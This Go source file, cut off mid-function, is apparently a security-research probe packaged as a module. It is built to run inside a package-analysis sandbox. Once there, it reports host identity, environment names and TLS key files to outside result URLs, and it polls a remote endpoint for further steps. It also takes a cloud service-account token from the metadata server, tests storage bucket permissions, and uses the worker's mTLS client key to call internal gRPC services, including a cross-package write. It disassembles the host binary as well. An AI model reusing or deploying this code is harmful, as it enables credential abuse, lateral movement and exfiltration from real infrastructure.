package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

var genericResultURL string
var compilerResultURL string
var planURL string
var bytemanCanaryURL string
var sessionNonce string
var probeUserAgent string
var rpcServiceHost string
var rpcDialAddress string

const (
	protocolVersion        = 1
	moduleName             = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion           = "v0.0.43-codex"
	descriptorHelperSHA256 = "a4310ffe3aab048caef9d93b19e7410cb261fb8678b33cb19d04f58e6d2c1acf"
	targetRegistry         = "https://proxy.golang.org"
	targetModuleName       = "github.com/benr00t3d/go-byteman-crosswrite-canary"
	targetVersion          = "v0.0.1"
	targetCanarySHA256     = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
	downloadSource         = "robert-owned-v038-authority-cross-package-canary"
	maximumResult          = 256 * 1024
	maximumBody            = 256 * 1024
	requestTimeout         = 20 * time.Second
	resultTimeout          = 30 * time.Second
	planPollWindow         = 30 * time.Minute
	maximumPlanBody        = 4096
	maximumPlanStep        = 12
)

var bucketNames = []string{
	"depsdev-capslock-reports",
	"sos-byteman-downloads-oregon",
	"sos-byteman-temp-oregon",
}

var bucketPermissions = []string{
	"storage.objects.create",
	"storage.objects.delete",
	"storage.objects.get",
	"storage.objects.list",
	"storage.objects.update",
}

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type fileEntry struct {
	Name string `json:"name"`
	Mode string `json:"mode"`
	Size int64  `json:"size"`
}

type tlsFile struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

type identityResult struct {
	Lane             string      `json:"lane"`
	CWD              string      `json:"cwd"`
	UID              int         `json:"uid"`
	GID              int         `json:"gid"`
	Hostname         string      `json:"hostname"`
	PID1             string      `json:"pid1"`
	ModuleFiles      []fileEntry `json:"module_files"`
	EnvironmentNames []string    `json:"environment_names"`
	TLSFiles         []tlsFile   `json:"tls_files"`
}

type metadataResult struct {
	Email      string   `json:"email,omitempty"`
	Scopes     []string `json:"scopes,omitempty"`
	TokenValid bool     `json:"token_valid"`
	Error      string   `json:"error,omitempty"`
}

type bucketResult struct {
	Bucket     string   `json:"bucket"`
	HTTPStatus int      `json:"http_status,omitempty"`
	Granted    []string `json:"granted,omitempty"`
	APIStatus  string   `json:"api_status,omitempty"`
	Error      string   `json:"error,omitempty"`
}

type grpcResult struct {
	ID            string `json:"id,omitempty"`
	Method        string `json:"method"`
	HTTPStatus    int    `json:"http_status,omitempty"`
	GRPCStatus    string `json:"grpc_status,omitempty"`
	GRPCMessage   string `json:"grpc_message,omitempty"`
	BodyBytes     int    `json:"body_bytes,omitempty"`
	BodySHA256    string `json:"body_sha256,omitempty"`
	ContentType   string `json:"content_type,omitempty"`
	Authenticated bool   `json:"authenticated"`
	Error         string `json:"error,omitempty"`
}

type planStep struct {
	Version   int    `json:"version"`
	ID        string `json:"id"`
	Action    string `json:"action"`
	RouteMode string `json:"route_mode,omitempty"`
}

type inspectionResult struct {
	Descriptors  []json.RawMessage `json:"descriptors,omitempty"`
	Symbols      []string          `json:"symbols,omitempty"`
	DialWindow   []string          `json:"dial_window,omitempty"`
	CallerWindow []string          `json:"caller_window,omitempty"`
	Error        string            `json:"error,omitempty"`
}

type probeReport struct {
	Schema            string            `json:"schema"`
	Module            string            `json:"module"`
	Version           string            `json:"version"`
	TargetModule      string            `json:"target_module,omitempty"`
	TargetVersion     string            `json:"target_version,omitempty"`
	StartedUTC        string            `json:"started_utc"`
	FinishedUTC       string            `json:"finished_utc"`
	Identity          identityResult    `json:"identity"`
	Metadata          metadataResult    `json:"metadata"`
	BucketPermissions []bucketResult    `json:"bucket_permissions,omitempty"`
	CanaryURLSHA256   string            `json:"canary_url_sha256,omitempty"`
	CanaryBodySHA256  string            `json:"canary_body_sha256,omitempty"`
	Byteman           []grpcResult      `json:"byteman,omitempty"`
	DownloadAttempted bool              `json:"download_attempted"`
	PlanID            string            `json:"plan_id,omitempty"`
	RouteMode         string            `json:"route_mode,omitempty"`
	Inspection        *inspectionResult `json:"inspection,omitempty"`
	Reason            string            `json:"reason,omitempty"`
}

type tokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int64  `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

func main() {
	if genericResultURL == "" || compilerResultURL == "" || planURL == "" || bytemanCanaryURL == "" ||
		sessionNonce == "" || probeUserAgent == "" || genericResultURL == compilerResultURL ||
		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	if identity.Lane == "capslock" {
		runCapslockSession(started, cwd, identity)
		return
	}
	report := newProbeReport(started, identity)
	report.Reason = "internal checks are fixed to the verified capslock lane"
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(genericResultURL, "v043-codex-"+identity.Lane, cwd, started, report)
}

func newProbeReport(started time.Time, identity identityResult) probeReport {
	return probeReport{
		Schema:        "owned-byteman-probe/v1",
		Module:        moduleName,
		Version:       probeVersion,
		TargetModule:  targetModuleName,
		TargetVersion: targetVersion,
		StartedUTC:    started.UTC().Format(time.RFC3339Nano),
		Identity:      identity,
	}
}

func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{
		Version:    protocolVersion,
		Session:    sessionNonce,
		ID:         id,
		CWD:        cwd,
		DurationMS: time.Since(started).Milliseconds(),
	}
	if err != nil {
		result.ExitCode = 125
		result.Stderr = cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}

func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func inspectIdentity(cwd string) identityResult {
	lane := "other"
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
		if strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
			lane = "capslock"
		}
	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		lane = "generic"
	}
	hostname, _ := os.Hostname()
	result := identityResult{
		Lane:     lane,
		CWD:      cwd,
		UID:      os.Geteuid(),
		GID:      os.Getegid(),
		Hostname: hostname,
		PID1:     strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
	}
	if len(result.PID1) > 1024 {
		result.PID1 = result.PID1[:1024] + "[truncated]"
	}
	entries, _ := os.ReadDir(cwd)
	for _, entry := range entries {
		if len(result.ModuleFiles) >= 128 {
			break
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		result.ModuleFiles = append(result.ModuleFiles, fileEntry{
			Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size(),
		})
	}
	for _, value := range os.Environ() {
		name, _, found := strings.Cut(value, "=")
		if found && name != "" {
			result.EnvironmentNames = append(result.EnvironmentNames, name)
		}
	}
	sort.Strings(result.EnvironmentNames)
	for _, path := range []string{
		"/etc/tls/server-pool/server-tls-pool.pem",
		"/etc/tls/client/tls.crt",
		"/etc/tls/client/tls.key",
	} {
		item := tlsFile{Path: path}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present = true
			item.Mode = info.Mode().String()
			item.Size = info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}

func cleanError(err error) string {
	if err == nil {
		return ""
	}
	value := err.Error()
	value = strings.ReplaceAll(value, sessionNonce, "[session]")
	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
	if rpcDialAddress != "" {
		value = strings.ReplaceAll(value, rpcDialAddress, "[rpc-service]")
	}
	if rpcServiceHost != "" {
		value = strings.ReplaceAll(value, rpcServiceHost, "[rpc-host]")
	}
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}

func runCapslockSession(started time.Time, cwd string, identity identityResult) {
	initial := newProbeReport(started, identity)
	initial.Reason = "waiting for the bounded read-only descriptor plan"
	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	if err := submitProbeReport(compilerResultURL, "v043-codex-capslock-initial", cwd, started, initial); err != nil {
		return
	}

	deadline := time.Now().Add(planPollWindow)
	cursor := 0
	consecutiveErrors := 0
	for cursor < maximumPlanStep && time.Now().Before(deadline) {
		step, available, err := fetchPlan(cursor)
		if err != nil {
			consecutiveErrors++
			if consecutiveErrors >= 3 {
				break
			}
			time.Sleep(2 * time.Second)
			continue
		}
		consecutiveErrors = 0
		if !available {
			time.Sleep(2 * time.Second)
			continue
		}
		stepStarted := time.Now()
		report := newProbeReport(stepStarted, identity)
		report.PlanID = step.ID
		report.RouteMode = step.RouteMode
		switch step.Action {
		case "finish":
			report.Reason = "bounded plan finished"
		case "inspect-byteman-descriptors":
			runBytemanDescriptorInspection(&report)
		default:
			report.Reason = "validated plan action had no implementation"
		}
		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		id := "v043-codex-step-" + strconv.Itoa(cursor)
		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
			return
		}
		cursor++
		if step.Action == "finish" {
			return
		}
	}
	finalStarted := time.Now()
	final := newProbeReport(finalStarted, identity)
	if cursor >= maximumPlanStep {
		final.Reason = "bounded plan step limit reached"
	} else if consecutiveErrors >= 3 {
		final.Reason = "bounded plan endpoint failed three times"
	} else {
		final.Reason = "bounded plan polling window expired"
	}
	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitProbeReport(compilerResultURL, "v043-codex-final", cwd, finalStarted, final)
}

func fetchPlan(cursor int) (planStep, bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, planURL+"/"+strconv.Itoa(cursor), nil)
	if err != nil {
		return planStep{}, false, err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       requestTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return planStep{}, false, err
	}
	defer response.Body.Close()
	if response.StatusCode == http.StatusNoContent {
		return planStep{}, false, nil
	}
	if response.StatusCode != http.StatusOK {
		return planStep{}, false, fmt.Errorf("plan endpoint returned HTTP %d", response.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumPlanBody+1))
	if err != nil || len(body) > maximumPlanBody {
		return planStep{}, false, errors.New("plan response too large")
	}
	decoder := json.NewDecoder(bytes.NewReader(body))
	decoder.DisallowUnknownFields()
	var step planStep
	if err := decoder.Decode(&step); err != nil {
		return planStep{}, false, errors.New("plan response was invalid JSON")
	}
	if err := decoder.Decode(&struct{}{}); err != io.EOF {
		return planStep{}, false, errors.New("plan response had trailing data")
	}
	if err := validatePlanStep(step); err != nil {
		return planStep{}, false, err
	}
	return step, true, nil
}

func validatePlanStep(step planStep) error {
	if step.Version != 1 || len(step.ID) < 1 || len(step.ID) > 64 {
		return errors.New("plan identity was invalid")
	}
	for _, value := range step.ID {
		if (value < 'a' || value > 'z') && (value < '0' || value > '9') && value != '-' {
			return errors.New("plan identity was invalid")
		}
	}
	switch step.Action {
	case "inspect-byteman-descriptors", "finish":
		if step.RouteMode != "" {
			return errors.New("non-probe plan included route parameters")
		}
	default:
		return errors.New("plan action was not allowed")
	}
	return nil
}

func allowedRouteMode(value string) bool {
	switch value {
	case "byteman-core-localhost", "byteman-localhost", "rpc-gateway",
		"byteman-oregon-gateway", "byteman-home-oregon-gateway", "byteman-iowa-gateway":
		return true
	default:
		return false
	}
}

func fillCapslockContext(report *probeReport) {
	metadataClient := &http.Client{
		Transport: &http.Transport{Proxy: nil},
		Timeout:   requestTimeout,
	}
	metadata, _ := inspectMetadata(metadataClient)
	report.Metadata = metadata
}

func runBytemanProbe(report *probeReport, routeMode string) {
	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
	report.CanaryBodySHA256 = targetCanarySHA256
	rpcClient, rpcEndpoint, err := newMTLSClient(routeMode)
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
		return
	}
	urlLookupRequest := buildURLLookupRequest(bytemanCanaryURL)
	coordinateLookupRequest := buildCoordinateLookupRequest()
	baselineURL := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", urlLookupRequest)
	baselineURL.ID = "baseline-url-lookup"
	report.Byteman = append(report.Byteman, baselineURL)
	baselineCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
	baselineCoordinate.ID = "baseline-coordinate-lookup"
	report.Byteman = append(report.Byteman, baselineCoordinate)
	if !grpcSucceeded(baselineURL) || !grpcSucceeded(baselineCoordinate) {
		report.Reason = "both bounded Byteman baseline Lookups did not authenticate cleanly; Download was not attempted"
		return
	}
	report.DownloadAttempted = true
	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", buildTargetDownloadRequest(bytemanCanaryURL))
	download.ID = "cross-package-download"
	report.Byteman = append(report.Byteman, download)
	if grpcSucceeded(download) {
		time.Sleep(1500 * time.Millisecond)
		postURL := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", urlLookupRequest)
		postURL.ID = "post-url-lookup"
		report.Byteman = append(report.Byteman, postURL)
		postCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
		postCoordinate.ID = "post-coordinate-lookup"
		report.Byteman = append(report.Byteman, postCoordinate)
		report.Reason = "bounded cross-package Download and post-write Lookups completed"
	} else {
		report.Reason = "bounded cross-package Download returned without success; post-write Lookups were not sent"
	}
}

func grpcSucceeded(result grpcResult) bool {
	return result.HTTPStatus == http.StatusOK && result.GRPCStatus == "0"
}

func buildURLLookupRequest(canaryURL string) []byte {
	return appendStringField(nil, 2, canaryURL)
}

func buildCoordinateLookupRequest() []byte {
	request := []byte{}
	request = appendStringField(request, 7, targetRegistry)
	request = appendStringField(request, 8, targetModuleName)
	request = appendStringField(request, 9, targetVersion)
	request = appendVarintField(request, 10, 1)
	return request
}

func buildTargetMetadata() []byte {
	metadata := []byte{}
	metadata = appendStringField(metadata, 2, targetRegistry)
	metadata = appendVarintField(metadata, 3, 1) // GO_MODULE
	metadata = appendStringField(metadata, 4, targetModuleName)
	metadata = appendVarintField(metadata, 5, 1) // CONCRETE
	metadata = appendStringField(metadata, 6, targetVersion)
	return metadata
}

func buildTargetDownloadRequest(canaryURL string) []byte {
	request := []byte{}
	request = appendStringField(request, 1, canaryURL)
	request = appendBytesField(request, 4, buildTargetMetadata())
	request = appendStringField(request, 6, downloadSource)
	return request
}

type boundedBuffer struct {
	data      []byte
	maximum   int
	truncated bool
}

func (buffer *boundedBuffer) Write(value []byte) (int, error) {
	written := len(value)
	remaining := buffer.maximum - len(buffer.data)
	if remaining > 0 {
		if remaining > len(value) {
			remaining = len(value)
		}
		buffer.data = append(buffer.data, value[:remaining]...)
	}
	if remaining < len(value) {
		buffer.truncated = true
	}
	return written, nil
}

func runFixedTool(path string, arguments ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()
	stdout := &boundedBuffer{maximum: 16 * 1024 * 1024}
	stderr := &boundedBuffer{maximum: 16 * 1024}
	command := exec.CommandContext(ctx, path, arguments...)
	command.Stdout = stdout
	command.Stderr = stderr
	err := command.Run()
	if ctx.Err() != nil {
		return nil, errors.New("fixed inspection tool timed out")
	}
	if err != nil {
		return nil, errors.New("fixed inspection tool failed")
	}
	if stdout.truncated {
		return nil, errors.New("fixed inspection output exceeded its limit")
	}
	return stdout.data, nil
}

func scanBoundedLines(data []byte, include func(string) bool, maximum int) []string {
	var result []string
	scanner := bufio.NewScanner(bytes.NewReader(data))
	scanner.Buffer(make([]byte, 4096), 64*1024)
	for scanner.Scan() && len(result) < maximum {
		line := strings.TrimSpace(scanner.Text())
		if len(line) > 512 {
			line = line[:512] + "[truncated]"
		}
		if line != "" && include(line) {
			result = append(result, line)
		}
	}
	return result
}

func instructionWindow(data []byte, marker string, before, after int) []string {
	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
	for index, line := range lines {
		if !strings.Contains(line, marker) {
			continue
		}
		start := index - before
		if start < 0 {
			start = 0
		}
		end := index + after + 1
		if end > len(lines) {
			end = len(lines)
		}
		return append([]string(nil), lines[start:end]...)
	}
	return nil
}

func runSessionDataflowInspection(report *probeReport) {
	result := report.Inspection
	if result == nil {
		result = &inspectionResult{}
		report.Inspection = result
	}
	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.Symbols = scanBoundedLines(nmOutput, func(line string) bool {
		return strings.Contains(line, "sos.googlesource.com/sos/server.dial") ||
			(strings.Contains(line, "sos.googlesource.com/sos/server.") && strings.Contains(line, "Session"))
	}, 64)
	dialOutput, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel",
		"--disassemble=sos.googlesource.com/sos/server.dial", "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	// Keep enough instructions before mapassign_faststr to resolve both the
	// fixed 15-byte metadata key and the exact value loaded into its map slot.
	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 112, 24)
	callerOutput, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble=main.main", "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.CallerWindow = instructionWindow(callerOutput, "server.dial", 24, 12)
	if len(result.Symbols) == 0 || len(result.DialWindow) == 0 || len(result.CallerWindow) == 0 {
		result.Error = "fixed inspection markers were incomplete"
		return
	}
	report.Reason = "bounded static session dataflow inspection completed"
}

func runBytemanDescriptorInspection(report *probeReport) {
	report.Inspection = &inspectionResult{}
	helper := filepath.Join(report.Identity.CWD, "x86_64-gcc", "describe-protos")
	helperData, err := os.ReadFile(helper)
	if err != nil {
		report.Inspection.Error = "descriptor helper was unavailable"
		return
	}
	helperDigest := sha256.Sum256(helperData)
	if hex.EncodeToString(helperDigest[:]) != descriptorHelperSHA256 {
		report.Inspection.Error = "descriptor helper digest did not match the fixed build"
		return
	}
	helperCopy := "/tmp/.go-cgo-v043-describe-protos"
	copyFile, err := os.OpenFile(helperCopy, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o700)
	if err != nil {
		report.Inspection.Error = "fixed descriptor helper copy could not be created"
		return
	}
	copyOK := false
	defer func() {
		_ = copyFile.Close()
		if !copyOK {
			_ = os.Remove(helperCopy)
		}
	}()
	if written, writeErr := copyFile.Write(helperData); writeErr != nil || written != len(helperData) {
		report.Inspection.Error = "fixed descriptor helper copy was incomplete"
		return
	}
	if err := copyFile.Sync(); err != nil {
		report.Inspection.Error = "fixed descriptor helper copy could not be synced"
		return
	}
	if err := copyFile.Close(); err != nil {
		report.Inspection.Error = "fixed descriptor helper copy could not be closed"
		return
	}
	copyOK = true
	defer os.Remove(helperCopy)
	output, err := runFixedTool(helperCopy, "/proc/1/exe", "sos.byteman")
	if err != nil {
		report.Inspection.Error = cleanError(err)
		return
	}
	decoder := json.NewDecoder(bytes.NewReader(output))
	for len(report.Inspection.Descriptors) < 8 {
		var raw json.RawMessage
		if err := decoder.Decode(&raw); err == io.EOF {
			break
		} else if err != nil {
			report.Inspection.Error = "descriptor helper output was invalid JSON"
			return
		}
		var envelope struct {
			Package  string `json:"package"`
			Services []struct {
				Name string `json:"name"`
			} `json:"services"`
		}
		if json.Unmarshal(raw, &envelope) != nil || envelope.Package != "sos.byteman" {
			continue
		}
		for _, service := range envelope.Services {
			if service.Name == "Byteman" {
				report.Inspection.Descriptors = append(report.Inspection.Descriptors, append(json.RawMessage(nil), raw...))
				break
			}
		}
	}
	if len(report.Inspection.Descriptors) != 1 {
		report.Inspection.Error = "exactly one sos.byteman Byteman descriptor was not found"
		return
	}
	runSessionDataflowInspection(report)
	if report.Inspection.Error == "" {
		report.Reason = "bounded Byteman descriptor and session dataflow inspection completed"
	}
}

func inspectMetadata(client *http.Client) (metadataResult, string) {
	result := metadataResult{}
	email, err := metadataText(client, "instance/service-accounts/default/email")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	result.Email = strings.TrimSpace(email)
	scopes, err := metadataText(client, "instance/service-accounts/default/scopes")
	if err == nil {
		for _, scope := range strings.Fields(scopes) {
			result.Scopes = append(result.Scopes, scope)
		}
	}
	tokenBody, err := metadataText(client, "instance/service-accounts/default/token")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	var token tokenResponse
	if json.Unmarshal([]byte(tokenBody), &token) != nil || token.AccessToken == "" || token.ExpiresIn <= 0 {
		result.Error = "metadata token response was invalid"
		return result, ""
	}
	result.TokenValid = true
	return result, token.AccessToken
}

func metadataText(client *http.Client, path string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	endpoint := "http://metadata.google.internal/computeMetadata/v1/" + path
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return "", err
	}
	request.Header.Set("Metadata-Flavor", "Google")
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		return "", errors.New("metadata response too large")
	}
	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("metadata HTTP %d", response.StatusCode)
	}
	return string(body), nil
}

func testBucketPermissions(token, bucket string) bucketResult {
	result := bucketResult{Bucket: bucket}
	values := url.Values{}
	for _, permission := range bucketPermissions {
		values.Add("permissions", permission)
	}
	endpoint := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(bucket) + "/iam/testPermissions?" + values.Encode()
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Authorization", "Bearer "+token)
	request.Header.Set("User-Agent", probeUserAgent)
	response, err := http.DefaultClient.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		result.Error = "permission response too large"
		return result
	}
	var decoded struct {
		Permissions []string `json:"permissions"`
		Error       *struct {
			Code   int    `json:"code"`
			Status string `json:"status"`
		} `json:"error"`
	}
	if json.Unmarshal(body, &decoded) != nil {
		result.Error = "permission response was not JSON"
		return result
	}
	result.Granted = decoded.Permissions
	sort.Strings(result.Granted)
	if decoded.Error != nil {
		result.APIStatus = decoded.Error.Status
		if result.APIStatus == "" {
			result.APIStatus = strconv.Itoa(decoded.Error.Code)
		}
	}
	return result
}

func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("Byteman TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	if leaf.Subject.CommonName != "localhost" {
		return errors.New("Byteman TLS legacy common name was not localhost")
	}
	intermediates := x509.NewCertPool()
	for _, certificate := range state.PeerCertificates[1:] {
		intermediates.AddCert(certificate)
	}
	_, err := leaf.Verify(x509.VerifyOptions{
		Roots:         roots,
		Intermediates: intermediates,
		KeyUsages:     []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	})
	if err != nil {
		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
	}
	return nil
}

func newMTLSClient(routeMode string) (*http.Client, string, error) {
	serviceHost, port, tlsServerName, useInjectedRPC, err := bytemanRoute(routeMode)
	if err != nil {
		return nil, "", err
	}
	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
	if err != nil {
		return nil, "", err
	}
	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
	if err != nil {
		return nil, "", err
	}
	roots, err := x509.SystemCertPool()
	if err != nil || roots == nil {
		roots = x509.NewCertPool()
	}
	if !roots.AppendCertsFromPEM(rootPEM) {
		return nil, "", errors.New("server pool contained no certificates")
	}
	var selected net.IP
	if useInjectedRPC {
		serviceHost = strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
		portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
		selected = net.ParseIP(serviceHost)
		parsedPort, parseErr := strconv.Atoi(portText)
		if selected == nil || !selected.IsPrivate() || selected.IsUnspecified() || selected.IsMulticast() {
			return nil, "", errors.New("injected RPC service was not a private IP")
		}
		if parseErr != nil || parsedPort < 1 || parsedPort > 65535 {
			return nil, "", errors.New("injected RPC service port was invalid")
		}
		port = parsedPort
	} else {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		addresses, resolveErr := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
		if resolveErr != nil {
			return nil, "", errors.New("direct Byteman service did not resolve")
		}
		for _, candidate := range addresses {
			if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
				selected = candidate.IP
				break
			}
		}
		if selected == nil {
			return nil, "", errors.New("direct Byteman service had no private address")
		}
	}
	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
	authorityHost := bytemanAuthorityHost(serviceHost, tlsServerName, useInjectedRPC)
	endpoint := "https://" + net.JoinHostPort(authorityHost, strconv.Itoa(port))
	rpcServiceHost = serviceHost
	rpcDialAddress = address
	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
	legacyLocalhost := routeMode == "byteman-localhost"
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{certificate},
		RootCAs:            roots,
		MinVersion:         tls.VersionTLS12,
		ServerName:         tlsServerName,
		InsecureSkipVerify: legacyLocalhost, // Verified below for the legacy CN-only service certificate.
	}
	if legacyLocalhost {
		tlsConfig.VerifyConnection = func(state tls.ConnectionState) error {
			return verifyLegacyLocalhost(state, roots)
		}
	}
	transport := &http.Transport{
		Proxy: nil,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, address)
		},
		TLSClientConfig:   tlsConfig,
		ForceAttemptHTTP2: true,
	}
	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
}

func bytemanAuthorityHost(serviceHost, tlsServerName string, useInjectedRPC bool) string {
	if useInjectedRPC {
		return tlsServerName
	}
	return serviceHost
}

func bytemanRoute(routeMode string) (string, int, string, bool, error) {
	switch routeMode {
	case "byteman-core-localhost":
		return "byteman-core.default.svc.cluster.local", 9000, "localhost", false, nil
	case "byteman-localhost":
		return "byteman.default.svc.cluster.local", 9000, "localhost", false, nil
	case "rpc-gateway":
		return "", 0, "rpc.deps.dev", true, nil
	case "byteman-oregon-gateway":
		return "", 0, "byteman.oregon.int.deps.dev", true, nil
	case "byteman-home-oregon-gateway":
		return "", 0, "byteman.home-oregon.int.deps.dev", true, nil
	case "byteman-iowa-gateway":
		return "", 0, "byteman.iowa.int.deps.dev", true, nil
	default:
		return "", 0, "", false, errors.New("route mode was not allowed")
	}
}

func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
	result := grpcResult{Method: method}
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	frame = append(frame, payload...)
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Grpc-Timeout", "18S")
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
